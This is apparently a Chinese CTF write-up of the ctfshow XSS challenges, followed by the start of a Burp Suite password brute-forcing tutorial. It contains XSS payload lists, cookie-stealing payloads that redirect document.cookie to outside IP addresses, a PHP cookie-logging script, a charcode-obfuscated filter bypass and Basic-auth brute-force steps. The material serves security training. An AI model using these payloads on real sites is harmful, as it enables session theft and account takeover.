应用中的计算机安全漏洞。\n\n站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动**态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容**。动态站点会受到称XSS的威胁，而**静态站点则完全不受其影响**。\n\n  跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容\n\n  攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：**跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。**\n\n  xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以**xss漏洞关键就是寻找参数未过滤的输出函数。**\n\n### 利用的函数\n\n比如说php中的脚本的输出函数\n\n  常见的输出函数有：`print`、`print_r`、`echo`、`printf`、`sprintf`、`die`、`var_dump`、`var_export`\n\n### 产生层面\n\n**产生层面一般都是在前端**，JavaScript代码能干什么，执行之后就会达到相应的效果\n\n### 利用场景\n\n1. 浏览器可以执行JavaScript代码（这不是废话吗）。\n2. 网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等\n\n那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个”互”,所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)，xss本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。\n\n### 危害（能拿来干什么）\n\n- 窃取cookie 或token 来获得用户登录态；\n- 劫持流量，把用户正在访问的页面跳转到钓鱼网站；\n- 盗用账户来转账、群发信息等；\n- 利用用户的设备来发起DDOS攻击；\n- 网站挂马\n- 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力\n- 盗窃企业重要的具有商业价值的资料\n\n所以归根结底，x**ss的攻击方式就是想办法\"教唆\"用户的浏览器去执行一些这个网页中原本不存在的前端代码**。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert(\"say something\")的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。\n\n1. 窃取网页浏览中的cookie值。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用）\n2. 劫持流量实现恶意跳转。这个很简单，就是在网页中想办法插入一句像这样的语句：http://www.baidu.com那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。\n\n### 利用环境\n\n利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）\n\n## 0x03xss攻击\n\nXSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击\n\n（1）来自内部的攻击\n  主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。\n\n（2）来自外部的攻击\n  主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。\n\n## 0x04xss分类及介绍\n\n#### 1、反射型(非持久化)\n\n1.原理\n  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。\n\n2.攻击方式\n\n  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞\n\n3 判断是否存在反射型xss漏洞并利用\n\n判断方法:判断有没有过滤一些特殊的字符串（比如对比输出的字符和输出的字符）,然后测试观察源代码有没有成功插入，如果可以插入那就构造payload进行注入\n\n这里简单写个demo来看看\n\ndemo\n\n```php\n<?php\n$xss=$_GET['x'];\necho $xss;\n```\n\n```\n?x=<script>alert(1)</script>\n```\n\n![img](./../image/achieve/202411/xss--ctfshow/07a1746c6488d6afa192ea6f9f8771ec.png)\n\n传入后直接就出现弹窗了,说明我们的恶意代码被解析插入网页中了，但这个demo相对简单，不能更好的理解攻击原理，我们再举个demo看看\n\n这里我就直接拿我朋友的demo来介绍了\n\n```jsp\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>XSS 测试页面</title>\n</head>\n<body>\n<h1>XSS 测试页面</h1>\n\n<form action=\"xss_test.jsp\" method=\"get\">\n    <label for=\"message\">输入消息:</label>\n    <input type=\"text\" id=\"message\" name=\"message\" value=\"<%= request.getParameter(\"message\") == null ? \"\" : request.getParameter(\"message\") %>\">\n    <button type=\"submit\">提交</button>\n</form>\n\n<div>\n    您输入的消息是：<%= request.getParameter(\"message\") == null ? \"null\" : request.getParameter(\"message\") %>\n</div>\n</body>\n</html>\n```\n\n如果使用`Tomcat`来搭建一个本地服务，其中载入`jsp`漏洞代码，即可进行`xss`测试\n\n先简单的写个`xss_test.jsp`直接用来测试的\n\n我们直接在输入框中输入\n\n```html\n<script>alert('XSS')</script>\n```\n\n发现弹窗成功，我们再看看代码\n\n```jsp\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>XSS 测试页面</title>\n</head>\n<body>\n<h1>XSS 测试页面</h1>\n\n<form action=\"xss_test.jsp\" method=\"get\">\n    <label for=\"message\">输入消息:</label>\n    <input type=\"text\" id=\"message\" name=\"message\" value=\"<script>alert('XSS');</script>\">\n    <button type=\"submit\">提交</button>\n</form>\n\n<div>\n    您输入的消息是：<script>alert('XSS');</script>\n</div>\n</body>\n</html>\n```\n\n可以看到我们的恶意代码插入了刚刚的输入框，也就是被放进源码之中解析了。\n\n到这里很多人就要问了，这个payload是什么，看不懂一点，那就先介绍一下payload\n\n分析payload\n\n```html\n<script>alert('XSS')</script>\n```\n\n- `<script>`标签用于在HTML文档中嵌入或引用JavaScript代码。浏览器会执行`<script>`标签内的代码。\n- `alert('XSS')`是一个JavaScript函数调用，用于在浏览器中弹出一个警告框，显示文本内容，这里的内容就是括号里面的“XSS”。\n\n反射型XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。\n\n#### 2.存储型\n\n![img](./../image/achieve/202411/xss--ctfshow/ac96e3daa1c8765aeadac3e7a94fda5f.png)\n\n（1）原理\n  存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击.每一个访问特定页面的用户，都会受到攻击。\n\n（2）攻击方式\n  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行\n\n（3）payload\n\n```html\n<img src=\"1\" onerror=\"alert(/xss/)\"/>\n```\n\n分析一下这个代码\n\n1. **`<img>` 标签**：\n   - 这是一个用于插入图像的 HTML 标签。在正常情况下，`src` 属性应该包含一个指向图像文件的有效 URL。\n2. **`src=\"1\"`**：\n   - 在这里，`src` 属性被设置为 `\"1\"`，这是一个无效的图像链接。当浏览器尝试加载这个图像时，它会失败，因为没有有效的图像文件可以加载。\n3. **`onerror` 属性**：\n   - `onerror` 是一个事件处理程序，当图片加载失败时触发。在这种情况下，由于 `src` 指向的是一个无效的资源，`onerror` 中的 JavaScript 代码将被执行。\n4. **`alert(/xss/)`**：\n   - 这是在 `onerror` 事件被触发时执行的 JavaScript 代码。`alert` 函数会弹出一个对话框，显示内容 `/xss/`。这里的 `/xss/` 是一个正则表达式字面量，在弹出的对话框中会被当作字符串处理。\n\n注入后重新刷新发现直接回显注入的东西，说明是存储型xss\n\n其实我们下面也会提到关于标签的，这里只是其中一种\n\n\n\n\n\n## 0x05xss常见标签语句\n\n### 0x01\\<a> 标签\n\n```\n<a href=\"javascript:alert(1)\">test</a>\n<a href=\"x\" onfocus=\"alert('xss');\" autofocus=\"\">xss</a>\n<a href=\"x\" onclick=eval(\"alert('xss');\")>xss</a>\n<a href=\"x\" onmouseover=\"alert('xss');\">xss</a>\n<a href=\"x\" onmouseout=\"alert('xss');\">xss</a>\n```\n\n### 0x02. \\<img>标签\n\n```\n<img src=x onerror=\"alert(1)\">\n<img src=x onerror=eval(\"alert(1)\")>\n<img src=1 onmouseover=\"alert('xss');\">\n<img src=1 onmouseout=\"alert('xss');\">\n<img src=1 onclick=\"alert('xss');\">\n```\n\n### 0x03. \\<iframe>标签\n\n```\n<iframe src=\"javascript:alert(1)\">test</iframe>\n<iframe onload=\"alert(document.cookie)\"></iframe>\n<iframe onload=\"alert('xss');\"></iframe>\n<iframe onload=\"base64,YWxlcnQoJ3hzcycpOw==\"></iframe>\n<iframe onmouseover=\"alert('xss');\"></iframe>\n<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\">\n```\n\n### 0x04. \\<audio> 标签\n\n```\n<audio src=1 onerror=alert(1)>\n<audio><source src=\"x\" onerror=\"alert('xss');\"></audio>\n<audio controls onfocus=eval(\"alert('xss');\") autofocus=\"\"></audio>\n<audio controls onmouseover=\"alert('xss');\"><source src=\"x\"></audio>\n\n```\n\n### 0x05. \\<video>标签\n\n```\n<video src=x onerror=alert(1)>\n<video><source onerror=\"alert('xss');\"></video>\n<video controls onmouseover=\"alert('xss');\"></video>\n<video controls onfocus=\"alert('xss');\" autofocus=\"\"></video>\n<video controls onclick=\"alert('xss');\"></video>\n```\n\n### 0x06. \\<svg> 标签\n\n```\n<svg onload=javascript:alert(1)>\n<svg onload=\"alert('xss');\"></svg>\n```\n\n### 0x07. \\<button> 标签\n\n```\n<button onclick=alert(1)>\n<button onfocus=\"alert('xss');\" autofocus=\"\">xss</button>\n<button onclick=\"alert('xss');\">xss</button>\n<button onmouseover=\"alert('xss');\">xss</button>\n<button onmouseout=\"alert('xss');\">xss</button>\n<button onmouseup=\"alert('xss');\">xss</button>\n<button onmousedown=\"alert('xss');\"></button>\n```\n\n### 0x08. \\<div>标签\n\n这个需要借助url编码来实现绕过\n\n```\n原代码：\n<div onmouseover='alert(1)'>DIV</div>\n经过url编码：\n<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>\n```\n\n### 0x09. \\<object>标签\n\n这个需要借助 data 伪协议和 base64 编码来实现绕过\n\n```\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=\"></object>\n```\n\n### 0x10. \\<script> 标签\n\n```\n<script>alert('xss')</script>\n<script>alert(/xss/)</script>\n<script>alert(123)</script>\n```\n\n### 0x11. \\<p> 标签\n\n```\n<p onclick=\"alert('xss');\">xss</p>\n<p onmouseover=\"alert('xss');\">xss</p>\n<p onmouseout=\"alert('xss');\">xss</p>\n<p onmouseup=\"alert('xss');\">xss</p>\n```\n\n### 0x12. \\<input> 标签\n\n```\n<input onclick=\"alert('xss');\">\n<input onfocus=\"alert('xss');\">\n<input onfocus=\"alert('xss');\" autofocus=\"\">\n<input onmouseover=\"alert('xss');\">\n<input type=\"text\" onkeydown=\"alert('xss');\"></input>\n<input type=\"text\" onkeypress=\"alert('xss');\"></input>\n<input type=\"text\" onkeydown=\"alert('xss');\"></input>\n```\n\n### 0x13. \\<details>标签\n\n```\n<details ontoggle=\"alert('xss');\"></details>\n<details ontoggle=\"alert('xss');\" open=\"\"></details>\n```\n\n### 0x14. \\<select> 标签\n\n```\n<select onfocus=\"alert('xss');\" autofocus></select>\n<select onmouseover=\"alert('xss');\"></select>\n<select onclick=eval(\"alert('xss');\")></select>\n```\n\n### 0x15. \\<form> 标签\n\n```\n<form method=\"x\" action=\"x\" onmouseover=\"alert('xss');\"><input type=submit></form>\n<form method=\"x\" action=\"x\" onmouseout=\"alert('xss');\"><input type=submit></form>\n<form method=\"x\" action=\"x\" onmouseup=\"alert('xss');\"><input type=submit></form>\n```\n\n### 0x16. \\<body> 标签\n\n```\n<body onload=\"alert('xss');\"></body>\n```\n\n# 反射性xss\n\n## web316\n\n### #反射性xss\n\n![image-20241119182822162](./../image/achieve/202411/xss--ctfshow/image-20241119182822162.png)\n\n反射性XSS\n\n### 解题思路\n\n这道题的话我们输入最经典的xss语句试一下\n\n```html\n<script>alert('XSS')</script>\n```\n\n#### 解析语句\\<script>alert('XSS')\\</script>\n\n提供的内容是一个JavaScript脚本，其中包含了一个弹窗警告（alert），用于展示一个包含‘XSS’文字的弹窗。\n\n插入后发现有弹窗显示xss，查看源代码的时候也看到web页面源代码有xss语句，证明我们的xss语句被成功插入并解析\n\n![image-20241119192443556](./../image/achieve/202411/xss--ctfshow/image-20241119192443556.png)\n\n```html\n<script>alert(document.cookie)</script>\n```\n\n![image-20241119203014705](./../image/achieve/202411/xss--ctfshow/image-20241119203014705.png)\n\n这里的话是相当于x自己了，我们拿到的是我们自己用户访问页面时候的cookie，但是这里可以看到需要admin权限\n\n所以我们需要的是管理员admin访问这个页面时候的cookie，那我们怎么去拿到admin的cookie呢?\n\n这时候就需要我们在web页面中插入xss语句来实现这个功能了\n\n### payload1:document.location.href\n\n```html\n<script>document.location.href=\"http://156.238.233.87/xss.php?cookie=\"+document.cookie</script>\n```\n\n解析一下\n\n1. `<script>`：这是HTML中用于嵌入JavaScript代码的标记。\n2. `document.location.href` 是 JavaScript 中用于获取当前页面的 URL 地址的属性，通过 `document.location.href` 可以获取当前页面的完整 URL，包括协议、域名、端口、路径以及查询参数等信息。这个属性通常用于获取当前页面的 URL，并且可以用来跳转到其他页面。\n3. 后面的http://xxx就是远端服务器的ip地址或者xss平台的域名，这样将会导致浏览器重定向到指定URL（`http://xxx/1.php?1=`）并且附带当前页面的 cookie 信息\n\n攻击的原理是，当用户浏览包含这段恶意脚本的网页时，浏览器会执行这段JavaScript代码，将用户的cookie信息发送到指定的恶意网站\n\n知道了攻击原理，我们需要另外创建一个php文件去执行后面这个1='+document.cookie的功能\n\n```php\n<?php\n\t$cookie = $_GET['cookie'];\n\t$time = date('Y-m-d h:i:s', time());\n\t$log = fopen(\"cookie.txt\", \"a\");\n\tfwrite($log,$time.':    '. $cookie . \"\\n\");\n\tfclose($log);\n?>\n```\n\n将xss语句插入网站后就可以等admin去访问网站了，访问之后就可以在服务器的网页目录中看到有cookie.txt文件，里面就有管理员的cookie啦\n\n![image-20241120120352350](./../image/achieve/202411/xss--ctfshow/image-20241120120352350.png)\n\n这里也可以看出后台是会有管理员进行定时的一个访问的，不然这题没法做了\n\n### payload2:window.open\n\n```html\n<script>window.open('http://118.31.168.198:39543/'+document.cookie)</script>\n```\n\n`window.open()` 方法用于打开一个新窗口或标签页，并加载指定的 URL并包含当前页面的cookie信息\n\n## web317\n\n### #过滤script标签\n\n一样的页面，题目提示说开始过滤，我们正常插入xss语句进去试试\n\n```php\n<script>alert('XSS')</script>\n```\n\n发现并没有弹窗，也没有生成正常的回显，猜测是script被过滤了导致无法插入页面\n\n我们看看有没有其他标签可以代替的\n\n### body标签\n\n\\`<body>` 标签是 HTML 文档结构中的一个重要标签，用来定义网页的主体部分\n\n语法\n\n```html\n<body>\n    <!-- 页面内容放在这里 -->\n</body>\n```\n\n`<body>` 标签常见属性：\n\n- `background`：指定页面背景的图片或颜色。\n- `text`：指定页面中文本的颜色。\n- `link`：指定未被访问链接的颜色。\n- `alink`：指定激活链接时的颜色。\n- `vlink`：指定已访问链接的颜色。\n\n```html\n<body onload=\"document.location.href=\"http://[ip]/xss.php?cookie=\"+document.cookie\"></body>\n<body onload=\"window.open('http://118.31.168.198:39543/'+document.cookie)\">\n```\n\nxss.php文件的内容是不变的，都可以用来接受cookie\n\n### iframe标签\n\n\\<iframe> 标签是在 HTML 中用来嵌入另一个 HTML 页面的标签\n\n语法\n\n```html\n<iframe src=\"嵌入页面的URL\" width=\"宽度\" height=\"高度\" frameborder=\"边框显示方式\"></iframe>\n```\n\n常见属性\n\n- `src`：指定要嵌入的页面的 URL 地址。\n- `width`：指定 iframe 的宽度。\n- `height`：指定 iframe 的高度。\n- `frameborder`：指定是否显示 iframe 的边框。可以设置为 `1` 表示显示边框，`0` 表示隐藏边框。\n\n```html\n<iframe onload=\"document.location.href='http://156.238.233.87/xss.php?cookie='+document.cookie\"></iframe>\n<iframe onload=\"window.open('http://118.31.168.198:39543/'+document.cookie)\"></iframe>\n```\n\n在这个 `<iframe>` 标签中，使用了 `onload` 事件。`onload` 事件在 `<iframe>` 内部的页面加载完成后被触发。\n\n### img标签\n\n<img> 标签是在 HTML 中用来插入图片的标签\n\n语法\n\n```html\n<img src=\"图片路径\" alt=\"替代文本\">\n```\n\n常见属性\n\n- `src`：指定要显示的图片的 URL 地址。\n- `alt`：用于指定图片的替代文本，当图片无法显示时会显示替代文本。这对于可访问性很重要，也有利于 SEO。\n- `width`：指定图片的宽度。\n- `height`：指定图片的高度。\n- `title`：提供一个关于图片的额外信息，通常当鼠标悬停在图片上时显示。\n- `style`：用于指定样式属性，如宽度、高度、边框等。\n- `class`：用于指定 CSS 类，可以通过 CSS 样式表来定义图片的样式。\n\n```html\n<img src=\"\" οnerrοr=location.href=\"\"http://[ip]/xss.php?cookie=\"+document.cookie\">\n```\n\n- 代码中利用了 `onerror` 事件。当浏览器无法加载指定的图片时（由于 `src` 属性中的路径为空），会触发 `onerror` 事件。\n\n不过好像我用img标签打不出来，看到别人的wp都打出来了，应该是环境问题\n\n这几个标签都是可以替代script的，其写法上会有些许不同\n\n## web318-319\n\n### #增加标签过滤\n\n一个个试试\n\n<img alert(1)>输入发现没有回显\n\n<body>alert(1)</body>输入发现有回显\n\n那我们试一下body标签\n\n```\n<body onload=\"document.location.href='http://[ip]/xss.php?cookie='+document.cookie\"></body>\n\n```\n\n![image-20241120123544602](./../image/achieve/202411/xss--ctfshow/image-20241120123544602.png)\n\n这里可以看到有flag了，第一个应该是我自己访问了这个网站拿到的我自己的cookie\n\n## web320-321\n\n### #绕过空格\n\n先输入这个试试\n\n```html\n<body onload=\"document.location.href='http://[ip]/xss.php?xss='+document.cookie\"></body>\n```\n\n这时候注意看url的参数，发现空格不见了\n\n![image-20241120145254131](./../image/achieve/202411/xss--ctfshow/image-20241120145254131.png)\n\n我们再加个空格试试\n\n```html\n<body onload =\"document.location.href='http://[ip]/xss.php?xss='+document.cookie\"></body>\n```\n\n![image-20241120145329147](./../image/achieve/202411/文件上传--ctfshow/image-20241120145329147.png)\n\n这下可以确定空格是被过滤了的，我们这时候就需要绕过空格了\n\n绕过空格的姿势在rce里面有很多，我们试试行不行\n\n### 绕过空格姿势\n\n/**/\n\n/\n\ntab(%09)\n\n### 额外的payload:\n\n#### js中String.fromCharCode()方法\n\nascii码转字符\n\n在不断查找wp之后我发现了这个函数也能用来打payload\n\n用它我可以构造一个payload：\n\n```html\n<body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));>\n```\n\n```\nString.fromCharCode(***)`就是`<script>document.location.href='http://120.46.41.173/Jay17/127.php?cookie='+document.cookie</script>\n```\n\n这里放两个脚本\n\n#### 字符串转ascii码脚本\n\n```python\ninput_str = input(\"请输入字符串: \")  # 获取用户输入的字符串\nascii_list = []\n# 遍历字符串，将每个字符转换为ASCII码，并添加到列表中\nfor char in input_str:\n    ascii_code = ord(char)  # 使用ord()函数获取字符的ASCII码\n    ascii_list.append(str(ascii_code))  # 将ASCII码转换为字符串并添加到列表\n# 将列表中的ASCII码用逗号隔开，并打印结果\nresult = ','.join(ascii_list)\nprint(\"转换后的ASCII码:\", result)\n\n```\n\n#### ascii码转字符串脚本\n\n```python\ndef ascii_to_string(ascii_str):\n    # 将以逗号分隔的ASCII码字符串分割成一个列表\n    ascii_list = ascii_str.split(',')\n    # 使用列表推导式将ASCII码转换为字符，并连接成一个字符串\n    result = ''.join(chr(int(code)) for code in ascii_list)\n    return result\n# 输入以逗号分隔的ASCII码字符串\nascii_str = input(\"请输入以逗号分隔的ASCII码字符串: \")\n\n# 调用函数进行转换并打印结果\nstring_result = ascii_to_string(ascii_str)\nprint(\"转换后的字符串:\", string_result)\n\n\n```\n\n## web322-326\n\n### #过滤xss\n\n常规的先试试\n\n```\n<body onload=\"document.location.href='http://[ip]/xss.php?xss='+document.cookie\"></body>\n```\n\n![image-20241120151233543](./../image/achieve/202411/文件上传--ctfshow/image-20241120151233543.png)\n\n这样看的话是没什么问题的，还是跟之前一样是过滤了空格，但是我正常插入我的payload的时候发现没有跳转成功\n\n我一开始以为是我的标签被过滤了，然后换了几个都没成功，后面才发现是xss被过滤了\n\n然后我就把php代码里面的参数改成cookie就成功了(因为我上一题测试的时候把参数从cookie换成xss了，所以刚好碰到这道题过滤了xss，也算是刚好学到这道题了) \n\n注:后面发现好像不止过滤了xss，script和空格，还过滤了img，iframe，分号和逗号，各位可以去测试一下\n\n## web323\n\n跟322的做法一样，不过因为我最后不是发现了322过滤了其他的字符嘛，我就拿来测试了一下\n\n![image-20241120153753204](./../image/achieve/202411/xss--ctfshow/image-20241120153753204.png)\n\n确实是过滤了img标签\n\n![image-20241120153647539](./../image/achieve/202411/xss--ctfshow/image-20241120153647539.png)\n\niframe标签也被过滤了\n\n剩下的符号我感觉跟payload暂时没什么关系，就不测了\n\n# 存储型xss\n\n## web327\n\n这次是开始存储型xss了\n\n![image-20241121163235464](./../image/achieve/202411/xss--ctfshow/image-20241121163235464.png)\n\n是一个写信的界面，因为我们写入的信会存储到服务器数据库中，所以我们可以把恶意代码存入数据库中，当用户浏览我们的信封时候就会执行xss代码，我们可以先做个测试\n\n上面已经对存储型xss进行了一定的了解，这里就直接开始测试\n\n```\n<script>alert('xss')</script>\n```\n\n往信封中插入这条最简单的语句\n\n![image-20241121163720264](./../image/achieve/202411/xss--ctfshow/image-20241121163720264.png)\n\n然后发现发送不了，然后我们看一下cookie发现也是需要admin权限，所以我们这封信应该发给admin，有思路了那就拿之前的payload放进去\n\n![image-20241121164836097](./../image/achieve/202411/xss--ctfshow/image-20241121164836097.png)\n\n发现上传成功，等待后台admin查阅信封就行，差不多几秒钟就可以了\n\n![image-20241121164916830](./../image/achieve/202411/xss--ctfshow/image-20241121164916830.png)\n\n就可以拿到flag了\n\n什么原理呢?因为我们的flag是来自于admin的cookie，所以我们需要让admin去访问链接执行这个xss代码，假设我们信封发给别人的话，信封会存储在数据库中，这个信封admin是不一定能接收到的，就比如我们通过qq邮箱向我们亲爱的舍友发送一个带有xss语句的恶意链接，这个信封只是发给你舍友，只有他当这个冤大头去点击这个链接，同理就可以知道为什么是发给admin了\n\n## web328\n\n是一个登录界面\n\n![image-20241121165611266](./../image/achieve/202411/xss--ctfshow/image-20241121165611266.png)\n\n尝试用admin和弱密码登录一下\n\n![image-20241121172155875](./../image/achieve/202411/xss--ctfshow/image-20241121172155875.png)\n\n可以看到这里是登录失败了，那我们用admin注册一下\n\n![image-20241121172225582](./../image/achieve/202411/xss--ctfshow/image-20241121172225582.png)\n\n显示不是admin，emmm那我们先随机注册一个，注册成功后登录\n\n![image-20241121172354984](./../image/achieve/202411/xss--ctfshow/image-20241121172354984.png)\n\n但是也没啥东西，我们看一下用户管理\n\n![image-20241121172418105](./../image/achieve/202411/xss--ctfshow/image-20241121172418105.png)\n\n显示还是需要管理员身份，这时候我们就有方向了，我们可以通过获取管理员的cookie，伪造管理员的身份去访问，这样就可以看到用户管理的界面了，或者另一个思路，也就是预期解，因为这里可以看到一个包含用户名和密码的数据库，所以我们通过注入xss语句在数据库中，当管理员访问的时候会让xss语句解析执行\n\n### 预期解:\n\n注册界面，在用户或者密码那里填入xss语句都行\n\n```html\n<body onload=\"document.location.href='http://[ip]/xss.php?xss='+document.cookie\"></body>\n```\n\n但是后来发现body用不了，那我们换成script试试\n\n```\n<script>document.location.href=\"http://[ip]/xss.php?cookie=\"+document.cookie</script>\n```\n\n上传后等一下，就可以在我们的服务器看到cookie.txt\n\n![image-20241121192145834](./../image/achieve/202411/xss--ctfshow/image-20241121192145834.png)\n\n这个应该就是admin的cookie了，在页面中修改cookie的值，然后刷新一下页面，发现页面一闪而过就没了\n\n![image-20241121192524240](./../image/achieve/202411/xss--ctfshow/image-20241121192524240.png)\n\n这个应该是抓到包才能看到回显了，那我们重新刷新网页然后抓包改cookie看看\n\n![image-20241121193746146](./../image/achieve/202411/xss--ctfshow/image-20241121193746146.png)\n\n为啥这里看不到内容呢?后来我看了官方的wp，官方是重启了js，但我这里重启了也不得行，那就只能跳过这道题了\n\n## web329\n\n![image-20241202112143252](./../image/achieve/202411/xss--ctfshow/image-20241202112143252.png)\n\n","tags":["XSS跨站"],"categories":["ctfshow"]},{"title":"web入门爆破篇-ctfshow(已做完)","url":"/2024/11/05/web入门爆破篇-ctfshow(已做完)/","content":"\n# 知识点：\n\n## 暴力破解原理\n\n暴力破解实际就是疯狂的输入密码进行尝试登录，针对有的人喜欢用一些个人信息当做密码，有的人喜欢用一些很简单的低强度密码，我们就可以针对性的生成一个字典，用脚本或者工具挨个去尝试登录。\n\n## 暴力破解前提\n\n1.没安装waf，或者安装了waf没有开启流量拦截\n\n2.没有规定输入密码多少次后无法继续输入\n\n3.没有验证码，或者验证码生成在数据包中与输入的验证码进行比对。\n\n4.判定输入密码次数等是根据数据包中的ip等判定，我们就可以用字典变换ip去绕过\n\n## burpsuite爆破的四种模式\n\n四种模式分别为：Sniper、Battering ram、Pitchfork、 Cluster bomb(推荐使用)\n\n## 1.Sniper(狙击手)\n\n作为比较常用的模式，Sniper的作用是对其中选定的参数一个一个依次遍历字典并且替换然后测试。sniper只能默认对第一个参数进行修改，而无法对两个参数同时进行爆破。\n\n## 2.Battering ram(攻城锤)\n\n不同于sniper，Battering ram是两个参数同时进行遍历一个字典的\n\n## 3.Pitchfork(草叉模式)\n\nPitchfork作为多字典，他的特点也非常明显，就是多个字典同时进行，与Battering ram有些相似之处，但是一个是多个人跑一个赛道，而一个是多个人，各有各的赛道。\n\n## 4.Cluster bomb(集束炸弹)(推荐爆破时使用)\n\nCluster bomb兼备了前面三种模式的所有的功能，那就是全部遍历，不放过所有情况，但是在超大字典的情况下，运算能力就限制了Cluster bomb模式的发挥，所以只要算力足够，那爆破出密码就不是问题。\n\n# web21基础爆破工具的使用\n\n1.查看题目\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/1356dd000ac142fc809e0999f53aeb05.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n是一道登录题，\n\n此题主要考察基础的爆破\n\n## 方法一:bp爆破\n\n1：假设已知用户名是admin\n\n2：打开代理和Burp Suite，随便输入密码尝试登陆同时利用Burp Suite抓包。\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/3cc4f460204f49ceab82954db935acc0.png)\n\n### 知识点:Authorization请求头\n\nAuthorization请求头用于验证是否有从服务器访问所需数据的权限。\n\n3：得到Authorization: Basic YWRtaW46YWRtaW4= 可以看到他数据包是通过加密发送的，并且前面有Basic,对后面的 进行base64解码查看格为 admin：密码\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/5418433a13e443f1bcb02102de98d502.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n4：查看Authorization请求头观察发现是base64编码 我们将请求包发送到intruder中，选择sniper模式。选择base64内容Authorization: Basic YWRtaW46YWRtaW4=，添加为playload position\n\n5：然后payload选择Custom iterator，根据已知格式，我们设置第一组payload位账号：admin，第二组一个冒号:，第三组密码：密码字典。 接下来设置Payload Processing的base64加密，点击add，选择encode>Base64-encode，最后将PayLoad 